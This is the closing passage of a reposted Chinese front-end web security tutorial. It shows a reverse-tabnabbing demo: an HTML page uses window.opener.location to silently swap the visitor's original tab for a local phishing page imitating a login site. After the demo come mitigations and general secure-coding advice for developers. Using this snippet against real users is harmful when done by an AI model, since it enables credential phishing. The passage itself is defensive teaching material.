<p><span class="img-wrap"><img data-src="/img/bVB9PS" src="https://static.alili.tech/img/bVB9PS" alt="clipboard.png" title="clipboard.png" style="cursor: pointer; display: inline;"></span><br>图5.1.1<br>2 接着，我们在cheat.php这个网站上面，将跳转过来的源网页地址悄悄的进行修改。效果如图5.2.1</p>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="<!DOCYTPE HTML>
<html>
    <head>
        <meta charset=&quot;utf-8&quot; />
        <script src=&quot;https://ss0.bdstatic.com/5aV1bjqh_Q23odCf/static/superman/js/lib/jquery-1.10.2_d88366fd.js&quot;></script>
    </head>
    <body>
        你想看的信息：
        xxxxxxxxxxxxxx
        xxxxxxxxxxxxxx
        <script>
            // 在用户不知情的情况下，对跳转的来源网页进行地址替换
            window.opener.location = 'http://localhost:8082/lab/fish/myfishsite.php';
        </script>
    </body>
</html>" title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="hljs xml"><code><span class="hljs-tag">&lt;<span class="hljs-name">!DOCYTPE</span> <span class="hljs-attr">HTML</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"utf-8"</span> /&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://ss0.bdstatic.com/5aV1bjqh_Q23odCf/static/superman/js/lib/jquery-1.10.2_d88366fd.js"</span>&gt;</span><span class="undefined"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
        你想看的信息：
        xxxxxxxxxxxxxx
        xxxxxxxxxxxxxx
        <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
            <span class="hljs-comment">// 在用户不知情的情况下，对跳转的来源网页进行地址替换</span>
            <span class="hljs-built_in">window</span>.opener.location = <span class="hljs-string">'http://localhost:8082/lab/fish/myfishsite.php'</span>;
        </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre>
<p>于是，在用户访问了我们的欺骗网站后，之前的tab已经悄然发生了变化，我们将其悄悄的替换为了钓鱼的网站，欺骗用户输入用户名、密码等。<br><span class="img-wrap"><img data-src="/img/bVB9PW" src="https://static.alili.tech/img/bVB9PW" alt="clipboard.png" title="clipboard.png" style="cursor: pointer;"></span><br>图5.2.1<br>3 我们的钓鱼网站，伪装成XX空间，让用户输入用户名与密码，如图5.3.1<br><span class="img-wrap"><img data-src="/img/bVB9Qd" src="https://static.alili.tech/img/bVB9Qd" alt="clipboard.png" title="clipboard.png" style="cursor: pointer;"></span><br>图5.3.1<br>这种钓鱼方式比较有意思，重点在于我们比较难防住这种攻击，我们并不能将所有的页面链接都使用js打开。所以，要么就将外链跳转的连接改为当前页面跳转，要么就在页面unload的时候给用户加以提示，要么就将页面所有的跳转均改为window.open，在打开时，跟大多数钓鱼防治殊途同归的一点是，我们需要网民们的安全意识提高。</p>
<h1 id="articleHeader16">我们平时开发要注意些什么？</h1>
<ol>
<li><p>开发时要提防用户产生的内容，要对用户输入的信息进行层层检测</p></li>
<li><p>要注意对用户的输出内容进行过滤(进行转义等)</p></li>
<li><p>重要的内容记得要加密传输(无论是利用https也好，自己加密也好)</p></li>
<li><p>get请求与post请求，要严格遵守规范，不要混用，不要将一些危险的提交使用jsonp完成。</p></li>
<li><p>对于URL上携带的信息，要谨慎使用。</p></li>
<li><p>心中时刻记着，自己的网站哪里可能有危险。</p></li>
</ol>
<p>毕竟web安全是个很大的面，如果需要了解，还是需要进行专门的学习的。希望这篇聊一聊，可以让各位开发者的网站变得更安全。</p>
<h1 id="articleHeader17">课后作业</h1>
<p>各位看官自己的网站中，是不是还留有很多安全漏洞呢？请各位看完本篇文章之后，回想一下，自己的网站是否还有哪些地方存在安全隐患。还有，自己可否为自己团队里面的同学制定一下开发时的安全规范呢？</p>
<p>接下来的一篇文章，我将会和读者们一起聊聊web图片那些事儿，不要走开，请关注我.....</p>
<p><strong>如果喜欢本文请点击下方的推荐哦，你的推荐会变为我继续更文的动力。</strong></p>
<p>以上内容仅代表笔者个人观点，如有意见请通知笔者。</p>

                
{{< /raw >}}

# 版权声明
本文资源来源互联网，仅供学习研究使用，版权归该资源的合法拥有者所有，

本文仅用于学习、研究和交流目的。转载请注明出处、完整链接以及原作者。

原作者若认为本站侵犯了您的版权，请联系我们，我们会立即删除！

## 原文标题
[聊一聊系列]聊一聊WEB前端安全那些事儿

## 原文链接
[https://segmentfault.com/a/1190000006672214](https://segmentfault.com/a/1190000006672214)

